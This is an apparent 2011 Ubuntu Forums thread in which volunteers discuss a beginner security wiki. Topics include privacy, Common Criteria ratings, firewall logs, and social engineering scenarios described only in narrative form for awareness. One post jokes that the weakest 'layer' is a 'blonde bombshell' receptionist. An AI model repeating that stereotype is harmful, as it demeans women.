As far as a moderator of this forum accessing your cookies, that is not a function of vbulletin (let's not get people scared about mods). For it to occur the website itself would have to be compromised, which makes it no more likely that a moderator would have access to your cookies than an unknown user. As it stands moderators/administrators do not have access to your password, it is salted (by vbulletin) and MD5 hashed, they would have to obtain your credentials and crack them just like anyone else would, which already brings it to the point of illegal activity. 

As far as browser headers go, tampering with them is ill advised in this discussion for two reasons. One it is out of the scope of "beginner" material, and the second, if done inappropriately can break the functionality of most websites on the Internet.

We've already discussed the aspect that 90% of what is discussed on this forum gives too much information about your system to a potential attacker, the very fact that you are here does a considerable amount of research for the attacker. Combine that with the fact that we're discussing passwords, firewalls, apparmor profiles, and browser configurations pretty much seals the deal.

---

### Post by Thewhistlingwind on 2011-11-17
> **Dangertux said:**
> 
We've already discussed the aspect that 90% of what is discussed on this forum gives too much information about your system to a potential attacker, the very fact that you are here does a considerable amount of research for the attacker. Combine that with the fact that we're discussing passwords, firewalls, apparmor profiles, and browser configurations pretty much seals the deal.

Not all threats are from human attackers.

If someone launches an aggressive malware campaign, I'd feel better knowing that I've taken steps to mitigate the risk, as opposed to being too afraid of human attackers to ask for help.

---

### Post by Dangertux on 2011-11-17
> **Thewhistlingwind said:**
> Not all threats are from human attackers.

If someone launches an aggressive malware campaign, I'd feel better knowing that I've taken steps to mitigate the risk, as opposed to being too afraid of human attackers to ask for help.


I didn't mean that nobody should ask for help for security purposes. If I came across that way, that was not my intention.

I also agree that many attacks are automated -- however , someone had to automate them. Basically what I was eluding to in the post you quoted was this.

Evil malicious people want to target large groups of people for installing malware which will create a botnet. Evil bad guys discover ubuntu forums, they discover it is running an older version of Vbulletin and has quite a few security vulnerabilities. Evil bad guys compromise the site for two reasons, one it was vulnerable, and two because they know the target audience, they can create a set of exploits and payloads targeted to the sites visitor's and get a fairly high rate of return before the site's administrators discover it is compromised and remove the offending code.

This is a case where NoScript would help, because in the end, a 0 day is going to own you unless you utilize external methods for defeating it. On that interesting note just a few days ago POC code was released that allows remote code exec on Firefox 4/7/8 under Ubuntu. Just food for thought.

---

### Post by Thewhistlingwind on 2011-11-17
> **Dangertux said:**
>  Just food for thought.

And delicious food at that.

Of course, most visitors probably have a default install. 

No point in catering to anything too far beyond that. (From a malware writers perspective.)

---

### Post by Dangertux on 2011-11-18
I know this thread has kind of wound down since it started, but I looked at the wiki again today after not having looked at it for a few days, and I think to be honest its in a really good place. 

I'm kind of just hoping that everyone involved in the project thus far has learned from it, and as everyone continues to learn we can work to keep it fresh and relevant :-)

Great job everyone.

---

### Post by WasMeHere on 2011-11-18
> **Dangertux said:**
> I know this thread has kind of wound down since it started, but I looked at the wiki again today after not having looked at it for a few days, and I think to be honest its in a really good place. 

I'm kind of just hoping that everyone involved in the project thus far has learned from it, and as everyone continues to learn we can work to keep it fresh and relevant :-)

Great job everyone.
+1
If you, Dangertux, are happy with it, I am convinced that it is relevant with regards to the real security risks for newbies :-)

But I have a question concerning the other end of the 'knowledge and action pipeline'. How can we find out if it is easy enough and convincing enough so that it will make a difference for many Ubuntu users?

Olle

---

### Post by Ms. Daisy on 2011-11-18
> **Olle Wiklund said:**
> But I have a question concerning the other end of the 'knowledge and action pipeline'. How can we find out if it is easy enough and convincing enough so that it will make a difference for many Ubuntu users? I've gotten several responses from people and some have found it useful & some hate every word.  There's nothing we can do about that.  I think security is a bit like religion in that some already believe, some are willing to listen, & some just don't want to hear about it no matter what.

I would concur with DT that the Wiki is in a good place. That coupled with OSSS's eloquent comment  "wiki goooooood" seals the deal!  Where's haqking??? I feel a bit abandoned by him :cry: LOL.

Unrelated but relevant: based on a comment I got from a detractor, I've been reading several Ubuntu Manuals to see what the official Ubuntu stance is on security in general (and yes I'm dork enough to read all that). It's surprisingly hard to nail down.  In a very broad sense, we're in line with two sources but I've got several more to read.

---

### Post by haqking on 2011-11-18
> **Ms. Daisy said:**
> I've gotten several responses from people and some have found it useful & some hate every word.  There's nothing we can do about that.  I think security is a bit like religion in that some already believe, some are willing to listen, & some just don't want to hear about it no matter what.

I would concur with DT that the Wiki is in a good place. That coupled with OSSS's eloquent comment  "wiki goooooood" seals the deal!  Where's haqking??? I feel a bit abandoned by him :cry: LOL.

Unrelated but relevant: based on a comment I got from a detractor, I've been reading several Ubuntu Manuals to see what the official Ubuntu stance is on security in general (and yes I'm dork enough to read all that). It's surprisingly hard to nail down.  In a very broad sense, we're in line with two sources but I've got several more to read.

Never fear, haqking is here.

I havent gone anywhere, i am lurking in the shadows information gathering...LOL

I agree the Wiki is in a good place now, it was a difficult topic to cover with the intended audience.  Security is a specialist topic and often goes overlooked, hated, loved by many, each to their own until of course they get a problem and post on here about it.

As for canonicals stand on security, like me and DT were discussing in another thread yesterday.  Security for end user OS/Application is similar across the board and there is a security classification criteria which exists to which most OS adhere to or subscribe to and often need to if they want to be used in certain environments but we dont often mention it as it is not really relevant to the end user.

However the now Common Criteria (replacing TCSEC, ITSEC) is a standard of certifications which classify a given OS or Application etc with a certain level of security built in by default. (some of you may have heard of the rainbow books or orange book, this is the TCSEC).  These are standards to which vendors try if they wish to comply with.

Microsoft OS for example used to be a TCSEC C2 Rating, now in common criteria it is roughly EAL 4.  A linux Distro can seek certification, and some have such as Redhat, Suse etc who want to be placed in a given market and have been awarded EAL +3 or EAL 4 or 4+

Ubuntu since hardy have been EAL 4+ in the LTS range (intermediate releases drop a level or 2).

So to summarise the whole which is more secure Linux or Windows etc, or how secure is Ubuntu, or what is Ubuntu's security is easily answered.

They are all pretty much the same, the real security comes down to the user, what apps they use and install, services they run, and it is these types of thing the Wiki hopes to, tries to and does achieve to a degree so it is well placed right now.

So let me say again for clarity, all OS are pretty much the same as a default security config, the methods by which they achieve this security level may differ but are still achieved.

As soon as you go towards security, ease of use and functionality decrease, so often people complain saying this OS is insecure blah blah, but if it was any more secure by default it would no longer function or be easy to use and not be in the market for which it was intended.

IMHO

Cheers

---

### Post by WasMeHere on 2011-11-18
> **haqking said:**
> Never fear, haqking is here ...

So to summarise the whole which is more secure Linux or Windows etc, or how secure is Ubuntu, or what is Ubuntu's security is easily answered.

They are all pretty much the same, the real security comes down to the user, what apps they use and install, services they run, and it is these types of thing the Wiki hopes to, tries to and does achieve to a degree so it is well placed right now ...

Peace of mind from you too, haqking :-)

A big thank you to you all and in particular to Ms. Daisy and MrLeek :-({|=
from Olle

---

### Post by Dangertux on 2011-11-18
> **Ms. Daisy said:**
> I've gotten several responses from people and some have found it useful & some hate every word.  There's nothing we can do about that.  I think security is a bit like religion in that some already believe, some are willing to listen, & some just don't want to hear about it no matter what.

I would concur with DT that the Wiki is in a good place. That coupled with OSSS's eloquent comment  "wiki goooooood" seals the deal!  Where's haqking??? I feel a bit abandoned by him :cry: LOL.

Unrelated but relevant: based on a comment I got from a detractor, I've been reading several Ubuntu Manuals to see what the official Ubuntu stance is on security in general (and yes I'm dork enough to read all that). It's surprisingly hard to nail down.  In a very broad sense, we're in line with two sources but I've got several more to read.

Well -- That's what I was trying to say earlier, you can't "sell" security. If people don't want to hear it they don't want to hear it. As haqking said, the reality is people can argue Ubuntu is more secure than Windows all day long, but the fact of the matter is one is neither really more secure than the other. The methods for securing each are different, they each present unique challenges to both attackers and defenders. 

The general concensus that no viruses = security, is wrong to put it plainly. People don't get that, which is why education is paramount. I spend a lot of time talking about how an Ubuntu system can be compromised, a lot of times I will get messages saying something along the lines of "I'm an evil spy sent by Microsoft". The reason I explain this, is ultimately you can not defend against a threat you don't understand. It is my opinion that if you have an underlying understanding of what threats are there, you're going to be that much more able to defend against them. Nothing is impervious Ubuntu, Mac , Windows, Unix whatever. 

I think it's important to understand , especially for all those that "hate it", we're doing this for those who WANT to learn. If you're content to just convince yourself whatever you're running is secure out of the box, go for it. Fire up VNC, click whatever you want, and do what you do -- this isn't for you. We'll still be here when you realize that nothing is inherently secure and now so will the wiki.

---

### Post by WasMeHere on 2011-11-18
I just read the Wiki again, and I have this minor question:
> And of course, we'd be remiss not to mention social engineering. Understand what information you're putting out there. Know who you're giving valuable information to. **INSERT LINK Here** is a website dedicated to understanding social engineering, which is beyond the scope of this Wiki. 
Ms. Daisy,

Should it be like this or has somebody taken away a link and then nobody has remembered to insert a new one? Or haven't you found a link that is good enough yet?

Olle

---

### Post by Ms. Daisy on 2011-11-18
> **Olle Wiklund said:**
> I just read the Wiki again, and I have this minor question:
 
Ms. Daisy,
 
Should it be like this or has somebody taken away a link and then nobody has remembered to insert a new one? Or haven't you found a link that is good enough yet?I believe that one of the posters in this thread was interested in including that information, but I don't believe they ever followed up.  I think haqking offered a good site, I'll stick it in there later today.

---

### Post by haqking on 2011-11-18
> **Ms. Daisy said:**
> I believe that one of the posters in this thread was interested in including that information, but I don't believe they ever followed up.  I think haqking offered a good site, I'll stick it in there later today.

wasnt me, i think DT pm you one didnt he ?

My link would be the same i expect but wasnt sure if it was being posted or not ?

DT was it the Rel1K link ?

---

### Post by Dangertux on 2011-11-18
> **haqking said:**
> wasnt me, i think DT pm you one didnt he ?

My link would be the same i expect but wasnt sure if it was being posted or not ?

DT was it the Rel1K link ?


Yeah it was for Rel1K's site but I thought we decided that wasn't necessarily appropriate. I don't know. Perhaps instead of a link (that includes a download to tools) we could consider writing a simple section on common social engineering vectors. I'm pretty sure SE is one of the most misunderstood vectors. Everyone knows the scene from hackers where "Zero Cool" calls up the company and talks to the night guard and talks about his BLT drive getting fried and needing the modem number.

However, there are a ton of other vectors that people don't understand. For instance airbase ,etc.

---

### Post by haqking on 2011-11-18
> **Dangertux said:**
> Yeah it was for Rel1K's site but I thought we decided that wasn't necessarily appropriate. I don't know. Perhaps instead of a link (that includes a download to tools) we could consider writing a simple section on common social engineering vectors. I'm pretty sure SE is one of the most misunderstood vectors. Everyone knows the scene from hackers where "Zero Cool" calls up the company and talks to the night guard and talks about his BLT drive getting fried and needing the modem number.

However, there are a ton of other vectors that people don't understand. For instance airbase ,etc.

yeah but it is hard to decide what to cover, and is deserving in a wiki all of its own.

also need to be careful how we cover the airbase stuff with the closure of -ng threads here etc.

maybe just a SANS or CERT link would be enough ?

[http://www.us-cert.gov/cas/tips/ST04-014.html](http://www.us-cert.gov/cas/tips/ST04-014.html)

---

### Post by Ms. Daisy on 2011-11-18
> **haqking said:**
> As for canonicals stand on security, like me and DT were discussing in another thread yesterday. Security for end user OS/Application is similar across the board and there is a security classification criteria which exists to which most OS adhere to or subscribe to and often need to if they want to be used in certain environments but we dont often mention it as it is not really relevant to the end user.
 
However the now Common Criteria (replacing TCSEC, ITSEC) is a standard of certifications which classify a given OS or Application etc with a certain level of security built in by default. (some of you may have heard of the rainbow books or orange book, this is the TCSEC). These are standards to which vendors try if they wish to comply with.
 
Microsoft OS for example used to be a TCSEC C2 Rating, now in common criteria it is roughly EAL 4. A linux Distro can seek certification, and some have such as Redhat, Suse etc who want to be placed in a given market and have been awarded EAL +3 or EAL 4 or 4+
 
Ubuntu since hardy have been EAL 4+ in the LTS range (intermediate releases drop a level or 2).Thanks haqking! (now I'm humming the Mighty Mouse theme for some reason...) :D
 
So that's very interesting to know about the OS Common Criteria, I'll be looking into that in general. I guess what I'm looking for is slightly different, though. I'm sure that Ubuntu upholds all industry standards, just as Microsoft & Mac would. But what I want to find is what Ubuntu sells to its customers in regards to security. Ultimately what I'm trying to determine is whether the Wiki contradicts any official Ubuntu "promotional" statements, or statements made in other official manuals. Maybe I'm looking for what they SAY about security (i.e. promotional statements, tutorials, manuals for users), not what they DO about security (i.e. following the Common Criteria). Does that make sense? I'm not saying those things would necessarily be opposing or anything. I just want to compare what we've said with official documentation for my own purposes.[QUOTE=Dangertux]Well -- That's what I was trying to say earlier, you can't "sell" security. If people don't want to hear it they don't want to hear it.[/QUOTE] Yup, I finally really heard you. I think that may have been the most valuable lesson I learned through this process.

---

### Post by Dangertux on 2011-11-18
> **haqking said:**
> yeah but it is hard to decide what to cover, and is deserving in a wiki all of its own.

also need to be careful how we cover the airbase stuff with the closure of -ng threads here etc.

maybe just a SANS or CERT link would be enough ?

[http://www.us-cert.gov/cas/tips/ST04-014.html](http://www.us-cert.gov/cas/tips/ST04-014.html)

I think that one is a little incomplete -- and I really think wherever you're talking about social engineering the word trust needs to show up.

Ex 1 : 

"Facebook" sends you an email saying you need to  change your password -- there have been multiple attempts to compromise your account. Because you've been reading the security for newbies thread you're paranoid about that shady dangertux guy having stolen your credentials. The email contains a link that is apparently from facebook (I've demo'd this before) however it's actually to another website that looks exaclty like facebook, you are presented with a login , and then a change password form after you enter your credentials. However it's not facebook so your credentials don't change and dangertux now has your original credentials you used to log in.

Ex 2 : You receive a link to Youtube from a "friend" whom you trust. Assuming its funny you click it, Youtube pops up saying that your java is out of date and you need to click to update your java (read execute a payload). You do, you're  owned.

Ex 3 : You're at work, some naughty little hacker named carefultux has just gone dumpster diving. He notices that you have a dumpster full of cisco router boxes. He goes on ebay buys a Cisco polo puts on some slacks and walks right up to you the receptionist. And says he's from Cisco, he's here to talk to your IT department about the new routers you just purchased. You gladly inform him (you're trying to be helpful) that your firm IT outsources, but the server room is the last door on the left and check out whatever you need to.


Those are just some examples. All of which trust was violated, usually trust for a big name.

---

### Post by SparTacux on 2011-11-18
> **Dangertux said:**
> Security and privacy are not the same thing. A moderator could have access to your public IP. However, the other day when I was in IRC someone mentioned my public IP was being displayed when I logged in. I will say the same thing here as I said there.

Just because you have access to a public IP does not mean you can do anything with it. Which ultimately is the point of this guide imo. It's to help users configure their system so that it is not overtly vulnerable. The ipv4 address space is 32 bits, which means there are approximately 4.2 billion unique IP addresses. Scanning all of them would take a long time however is still feasible. So an IP address is not truly private. 

As far as a moderator of this forum accessing your cookies, that is not a function of vbulletin (let's not get people scared about mods). For it to occur the website itself would have to be compromised, which makes it no more likely that a moderator would have access to your cookies than an unknown user. As it stands moderators/administrators do not have access to your password, it is salted (by vbulletin) and MD5 hashed, they would have to obtain your credentials and crack them just like anyone else would, which already brings it to the point of illegal activity. 

As far as browser headers go, tampering with them is ill advised in this discussion for two reasons. One it is out of the scope of "beginner" material, and the second, if done inappropriately can break the functionality of most websites on the Internet.

We've already discussed the aspect that 90% of what is discussed on this forum gives too much information about your system to a potential attacker, the very fact that you are here does a considerable amount of research for the attacker. Combine that with the fact that we're discussing passwords, firewalls, apparmor profiles, and browser configurations pretty much seals the deal.

I was just highlighting the fact that Privacy is just as important as security. 

Configuring your system for security will protect your data, etc. Configuring your system for Privacy might protect your life. Consider the case of a Psycopath or Stalker trying to track you down. Just think of the scenario of a web owner who's looking for vulnerable victims. You can have the most secure system in the world but your IP is easily traced with an IP geolocator and you as a person can be narrowed down to handful of people in a given location even if you use just your first name as your user account.  Hope that clarifies things Adam.

For example, some guys posted some images on this security section and those images were located on external servers. If those sites belonged to them then  the could have got the IP's of everyone browsing the security thread. Geolcation would have given them some idea of where they come from and they could have directed an attack with specific IP's in mind ( all gleaned from this forum ). Applying some privacy techniques would have stopped them doing that.

As for the mods getting your IP's - here's a section taken from the Forum code of conduct:

Users posting any content that violates this code of conduct may receive a warning or an infraction that creates a record of the behavior and will be connected to the account (this record is only visible by the member and staff), may have their posts edited or removed, may have their account or IP address banned temporarily or permanently, and could have a report filed against them to their internet access provider. The IP addresses of all users are recorded to provide evidence or assist in enforcing these rules.

I've no problems with that - I could use a proxy to hide myself if I wanted to.

Privacy is very important & you guys haven't done much in giving advice in this area.
Your security skills are second to none but you need to do more work on privacy. I'd also suggest a little more work on gathering information  with the purpose of nailing your attakers. I caught myself a hacker in the last week or so. I might just send him an email with the details I got him with :-)

Maybe this section of the Forum should be renamed Security and Privacy as this would give a better balance of protecting your system and also yourself ( You are far more important than your system ).

Just my take on things.

---

### Post by haqking on 2011-11-18
> **SparTacux said:**
> I was just highlighting the fact that Privacy is just as important as security. 

Configuring your system for security will protect your data, etc. Configuring your system for Privacy might protect your life. Consider the case of a Psycopath or Stalker trying to track you down. Just think of the scenario of a web owner who's looking for vulnerable victims. You can have the most secure system in the world but your IP is easily traced with an IP geolocator and you as a person can be narrowed down to handful of people in a given location even if you use just your first name as your user account.  Hope that clarifies things Adam.

For example, some guys posted some images on this security section and those images were located on external servers. If those sites belonged to them then  the could have got the IP's of everyone browsing the security thread. Geolcation would have given them some idea of where they come from and they could have directed an attack with specific IP's in mind ( all gleaned from this forum ). Applying some privacy techniques would have stopped them doing that.

As for the mods getting your IP's - here's a section taken from the Forum code of conduct:

Users posting any content that violates this code of conduct may receive a warning or an infraction that creates a record of the behavior and will be connected to the account (this record is only visible by the member and staff), may have their posts edited or removed, may have their account or IP address banned temporarily or permanently, and could have a report filed against them to their internet access provider. The IP addresses of all users are recorded to provide evidence or assist in enforcing these rules.

I've no problems with that - I could use a proxy to hide myself if I wanted to.

Privacy is very important & you guys haven't done much in giving advice in this area.
Your security skills are second to none but you need to do more work on privacy. I'd also suggest a little more work on gathering information  with the purpose of nailing your attakers. I caught myself a hacker in the last week or so. I might just send him an email with the details I got him with :-)

Maybe this section of the Forum should be renamed Security and Privacy as this would give a better balance of protecting your system and also yourself ( You are far more important than your system ).

Just my take on things.

Feel free to put forth Privacy related information.

The idea of the Wiki is basic Security so thats where the concentration lies.

If you want to write up a section on Privacy concerns feel free to do so, it is never ending, as is the Security area

As for gathering info or tracing your attackers, it is unlikely you would, or if you did the time and resources taken to do often outweighs the cost of the damage if any, and the global computer security related laws are different.

How do you know you traced an attacker ? how do you know their email ? how do you know they care either way ;-)

Online anonymity, security, privacy are all different things

---

### Post by Dangertux on 2011-11-18
As I've stated before -- Privacy and Security while not mutually exclusive are absolutely not the same thing.

BTW Spartacux , I don't mind you calling me by either my first or last name - in fact they're on my launchpad lol :-P

Also if you're refering to the images I linked here that are hosted on my server -- You'll also note my location is accurate in my Location , as well lol.

---

### Post by Ms. Daisy on 2011-11-18
> **Dangertux said:**
> I think that one is a little incomplete -- and I really think wherever you're talking about social engineering the word trust needs to show up.
 
Those are just some examples. All of which trust was violated, usually trust for a big name.Haquing said that it's deserving of its own Wiki, I agree.  While I think it's vital for a user to understand the true nature of SE, it's not possible to summarize in a few paragraphs. And if we tried to quickly summarize it, it would only end up looking like fear-mongering.  That's why I suggested linking to some other off-site discussion of SE.  I did some digging when it first came up and I found lots of SE references, but they were either hugely broad in their scope (therefore fantastically long) or they were specific to corporations (which would be mostly irrelevant to a desktop user).  So I wasn't able to provide a link at the time.  
 
 
[QUOTE=SparTacux]I was just highlighting the fact that Privacy is just as important as security. [/QUOTE]Agree with DT. I agree that Privacy is as important as Security.  Security & privacy seem to co-mingle but they are separate, broad topics.  If we tried to summarize it in the existing Wiki it would either be too long to be useful or it would just sound like fear-mongering.  And frankly I don't have it in me to try.  In all seriousness, SparTacux, maybe you can start a "Basic Privacy" wiki.  I bet you'll find some excellent contributors.

---

### Post by MrLeek on 2011-11-18
Well I managed to give the wik page a good read though. Made a bunch of amendments (nothing major, just lots of tweaks to the language) but there's very little I can do with the "Did I get owned" section since I don't want to introduce errors. I did spot this:

 >  
used as an example when looking at ufw.logs

{{{Nov  5 14:46:18 dangertux kernel: [ 2080.258253] [UFW BLOCK] IN= OUT=eth0 SRC=192.168.0.4 DST=224.0.0.251}}} 
 {{{LEN=67 TOS=0x00 PREC=0x00 TTL=255 ID=0 DF PROTO=UDP SPT=5353 DPT=5353 LEN=47}}}

Is this good or bad? I can envisage a newbie finding something similar in their log and going "eek!"

Linux Vulnerabilities: I've managed to merge two of the myth/realities into one. Whilst each myth/reality is good...it does add to the overall length of the wiki page. I'm thinking of merging the two malware myths (myth 2 and 5) but welcome for thoughts on this part before i proceed.

Backups: Squeezed two paragraphs into one. Cheated a little on the quoting, but nothing major.

Noscript: I've tried to add a "we understand that the Options button is annoying" sentence. I think it works, but welcome input there.

The nework traffic section is good - I'd be interested in ways to narrow down the amount of information made available. Then again, what was there enabled me to find out what the 2 random ports I had open were (AVG were behind it). The tricky bit is in explaining how you "know" that the provided example is bad. e.g. I've got "exim4" listed. If that's on a random port number then I should be suspicious? (It would help if I looked at this without 10 windows plus Steam running! :D)

"Did I just get owned" is one of those sections that's really good...and never going to be easy to access for the newbie. From recent posts on this thread, that might be "just the way it is". I'd like to try to dumb it down a little to make it more accessible, but I'm still trying to make sure I understand it first!!


Otherwise...a seriously fine effort and a lot of the edits I made were minor. Just get you guys to spell properly and we'll be ok! :D

---

### Post by Dangertux on 2011-11-18
> **MrLeek said:**
> Well I managed to give the wik page a good read though. Made a bunch of amendments (nothing major, just lots of tweaks to the language) but there's very little I can do with the "Did I get owned" section since I don't want to introduce errors. I did spot this:

 

Is this good or bad? I can envisage a newbie finding something similar in their log and going "eek!"

Linux Vulnerabilities: I've managed to merge two of the myth/realities into one. Whilst each myth/reality is good...it does add to the overall length of the wiki page. I'm thinking of merging the two malware myths (myth 2 and 5) but welcome for thoughts on this part before i proceed.

Backups: Squeezed two paragraphs into one. Cheated a little on the quoting, but nothing major.

Noscript: I've tried to add a "we understand that the Options button is annoying" sentence. I think it works, but welcome input there.

The nework traffic section is good - I'd be interested in ways to narrow down the amount of information made available. Then again, what was there enabled me to find out what the 2 random ports I had open were (AVG were behind it). The tricky bit is in explaining how you "know" that the provided example is bad. e.g. I've got "exim4" listed. If that's on a random port number then I should be suspicious? (It would help if I looked at this without 10 windows plus Steam running! :D)

"Did I just get owned" is one of those sections that's really good...and never going to be easy to access for the newbie. From recent posts on this thread, that might be "just the way it is". I'd like to try to dumb it down a little to make it more accessible, but I'm still trying to make sure I understand it first!!


Otherwise...a seriously fine effort and a lot of the edits I made were minor. Just get you guys to spell properly and we'll be ok! :D

Out of context that traffic is neither good nor bad just broadcast traffic.

As far as spelling -- I'm a victim of the US public education system I'm sorry lol.

---

### Post by Ms. Daisy on 2011-11-18
> **MrLeek said:**
> Otherwise...a seriously fine effort and a lot of the edits I made were minor. Just get you guys to spell properly and we'll be ok! :D  SO SO SO glad you jumped in!  I've been feeling a bit discouraged so I'm glad to get the help!  
 
As for the spelling... I spent a lot of time removing your incorrect (i.e. British) spellings from the Wiki.  I certainly hope you're not putting them back in! :P I kid of course.

---

### Post by MrLeek on 2011-11-18
Well I probably added a few Brit spellings, but I did catch myself for other "common" spelling differences. :)

Two random thoughts:

- Have we had newbies reading and commenting on what we've written. The feedback from any newbie who hasn't been able to add/edit material will be immense.

- I do like the idea of a Privacy part, but it will mean a further expansion and it's getting a little unwieldy. I'm going to play with a structure to create a "home page" (with all the myth's etc. in there) and then 2 or 3 pages that hang off that page. I think it will create a better structure overall - but feedback welcomed on that as well. For example, the "more advanced" page can then have summary points at the top of the page to help readers get into it. 

> SO SO SO glad you jumped in!  I've been feeling a bit discouraged so I'm glad to get the help!  

Hang in there Ms Daisy. The work you've put into this has been immense and it would never have got done without you.

---

### Post by Ms. Daisy on 2011-11-18
> **MrLeek said:**
> - Have we had newbies reading and commenting on  what we've written. The feedback from any newbie who hasn't been able to  add/edit material will be immense. Yes. Feedback from one very  involved new user was that it's too long to be considered easy to use.   However the second quote addresses this perfectly.  

Other feedback was that we were a bit evangelical about our approach,  bordering on fear-mongering.  If I step back and view that from another  angle, I think this comment originates because it's difficult to boil  down complex issues for a new user (OMG we're going in circles again.   The pros said this exact thing in the very beginning. But stick with me,  I know how to stop the recursion!)  If we're unsuccessful in  compressing difficult issues, it just sounds like fear-mongering &  paranoia.  This is something that I plan to work on in the Wiki over the  next several weeks.  Basically it consists of removing stuff that  sounds like opinions and instead stating it in more factual ways.  I may  have been a bit inflammatory in some of my language, too, that's easy  to fix.

> **MrLeek said:**
> - I do like the idea of a Privacy part, but it  will mean a further expansion and it's getting a little unwieldy. I'm  going to play with a structure to create a "home page" (with all the  myth's etc. in there) and then 2 or 3 pages that hang off that page. I  think it will create a better structure overall - but feedback welcomed  on that as well. For example, the "more advanced" page can then have  summary points at the top of the page to help readers get into it.   Yes!!!!!  I've been wanting to split it into smaller sections  but have lacked the motivation and the ability (seriously- I HATE the  wiki format- why must EVERYTHING have a steep learning curve?!?).  Feel  free to do whatever you want to it, from what you describe I'm in total  agreement. In fact, I'll wait to make the editorial changes I described  above until you tell me you're done slicing it up. I don't think there's  any hurry to get any of this done.  The basic facts are there and are  correct.  We just need to polish it up (because I for one like shiny  things) :grin:  Oh, and thanks for the encouraging words :)

---

### Post by haqking on 2011-11-18
> **Ms. Daisy said:**
> Yes. Feedback from one very  involved new user was that it's too long to be considered easy to use.   However the second quote addresses this perfectly.  

Other feedback was that we were a bit evangelical about our approach, ** bordering on fear-mongering**.  


Whenever you reveal the realities of security you are fear mongering, especially within a given circle of a particular OS such as Ubuntu.

It is something we as security professionals deal with everyday, a simple example is:

admin: you should use a complex password.

end user: yeah yeah its not like i have anything important in my docs folder

Best thing is to ignore these comments, let the people who want a primer use it, those who dont or dont agree with the realities of the security or lack thereof dont use it, simple.

Without the people who think things are secure or who see everything as FUD we wouldnt have security jobs ;-)

---

### Post by OpSecShellshock on 2011-11-18
I really do think getting into privacy would expand the scope of things far too much. I know it's a subject some folks care deeply about (where "deeply" falls short of actually reading policies, of course), but can really be its own beast. And frankly, if people think that the changes to their systems and habits that we suggest for security are burdensome, then they'll hate what it takes to get decent privacy.

On social engineering: it's really tough to approach in a context like what this site is meant for, as there can be a fine line between pointing out things to avoid on one hand and providing instruction in how to do it on the other. That might not be so bad, except that it's got an astounding success rate. Look back on the last year of breaches, and understand that's how most--if not all--of them started. What's worse is that a lot of them, in hindsight, weren't particularly good.

---

### Post by MrLeek on 2011-11-18
Well if we just focus on a structure to cover the material that's already written then we can figure out the pro's/con's of the privacy angle. The tricky bit will be writing privacy coming from an Ubuntu angle - it's easy to say "don't allow everyone to view your Facebook page"...but that's OS generic.

Mind you, a lot of things are OS generic in all of this so maybe it doesn't matter.

@ Ms Daisy - totally agree with your approach. As we refine what we have (e.g. I fixed a load of "see this link" stuff which users that use software to "read" web pages hate) we'll hopefully get more newbie feedback - helping the editing even more.

I don't see any issues with either of us tweaking what's there - the new structure will probably keep the existing heading. All I'll be doing is doing a load of cut-paste into each page.

Finally on the "evangelical" bit...parts of it always will be. But it has got me wondering that with a front page that just explains why this is important we might be able to present/sell things a lot better, making it easier for other newbies to make the effort to implement at least some of these features.

I don't care....I've learnt loads already and I'm making more sense out of material that just blew my mind a few weeks ago! :)

---

### Post by Ms. Daisy on 2011-11-18
> **OpSecShellshock said:**
>  I know it's a subject some folks care deeply about (where "deeply" falls short of actually reading policies, of course)That is the funniest f#@%ing thing I've read all day.  Thank you for that! :lolflag:

---

### Post by Ms. Daisy on 2011-11-19
Someone said some nice things about the people in this thread...

[http://dangertux.wordpress.com/2011/11/19/great-job-ubuntu-community/](http://dangertux.wordpress.com/2011/11/19/great-job-ubuntu-community/) 

:)

---

### Post by haqking on 2011-11-19
> **Ms. Daisy said:**
> Someone said some nice things about the people in this thread...

[http://dangertux.wordpress.com/2011/11/19/great-job-ubuntu-community/](http://dangertux.wordpress.com/2011/11/19/great-job-ubuntu-community/) 

:)

you visited a wordpress site from DT ? hope you had NoScript running....LOL

I JEST i JEST i JEST

in all seriousness, thanks for the kind mention on there DT and i agree with your comments on the thread and the other contributors, you all did a great job (not past tense by the way) as it will be a continuing and constantly updated and reviewed project i am sure.

Cheers and beers to all

Edit: blimey i almost forgot a direct thanks to DT himself whose knowledge in the real Pen Testing world and hands on security skills are some of the best and most knowledgeable i have come across in the Security field, along with being very polite in the face of some posts i would certainly not contain myself with my response ;-)

---

### Post by CharlesA on 2011-11-19
> **Ms. Daisy said:**
> Someone said some nice things about the people in this thread...

[http://dangertux.wordpress.com/2011/11/19/great-job-ubuntu-community/](http://dangertux.wordpress.com/2011/11/19/great-job-ubuntu-community/) 

:)

Nice blog entry, DT! :)

---

### Post by Dangertux on 2011-11-19
> **haqking said:**
> you visited a wordpress site from DT ? hope you had NoScript running....LOL

I JEST i JEST i JEST

in all seriousness, thanks for the kind mention on there DT and i agree with your comments on the thread and the other contributors, you all did a great job (not past tense by the way) as it will be a continuing and constantly updated and reviewed project i am sure.

Cheers and beers to all

So you're not sore about the billion years thing then? lol

---

### Post by haqking on 2011-11-19
> **Dangertux said:**
> So you're not sore about the billion years thing then? lol

i dont get sore about things like that, with great age comes great maturity....LOL

besides i had forgotten what you had wrote already ;-)

---

### Post by lisati on 2011-11-19
> **haqking said:**
> It is something we as security professionals deal with everyday, a simple example is:

admin: you should use a complex password.

end user: yeah yeah its not like i have anything important in my docs folder

True: this reminds me of the oldy but goody that passwords/locks/(insert random security measure) only keep out the honest people.

---

### Post by Dangertux on 2011-11-19
> **lisati said:**
> True: this reminds me of the oldy but goody that passwords/locks/(insert random security measure) only keep out the honest people.

Well the problem really is this. You have all these nifty devices to secure a network but there is nobody securing Layer 8 :-) 

(which for those who do not know, is the 20 something year old blonde bombshell sitting at the front desk answering phones and clicking things on facebook)

---

### Post by haqking on 2011-11-19
> **Dangertux said:**
> Well the problem really is this. You have all these nifty devices to secure a network but there is nobody securing Layer 8 :-) 

(**which for those who do not know, is the 20 something year old blonde bombshell sitting at the front desk answering phones and clicking things on facebook**)

ahhh the only reason i own a Fed-Ex uniform.

in joke ;-)

---

### Post by Ms. Daisy on 2011-11-19
> **haqking said:**
> ahhh the only reason i own a Fed-Ex uniform.

in joke ;-)
:lolflag:

---

### Post by WasMeHere on 2011-11-19
> **Ms. Daisy said:**
> Someone said some nice things about the people in this thread...

[http://dangertux.wordpress.com/2011/11/19/great-job-ubuntu-community/](http://dangertux.wordpress.com/2011/11/19/great-job-ubuntu-community/) 

:)

Thank you for the nice words, DT!
... and I appreciate ***your*** contributions very much
Olle

---

### Post by Dangertux on 2011-11-19
> **haqking said:**
> ahhh the only reason i own a Fed-Ex uniform.

in joke ;-)

Stop stealing my ideas!!! lol :-P

---

### Post by lisati on 2011-11-19
> **haqking said:**
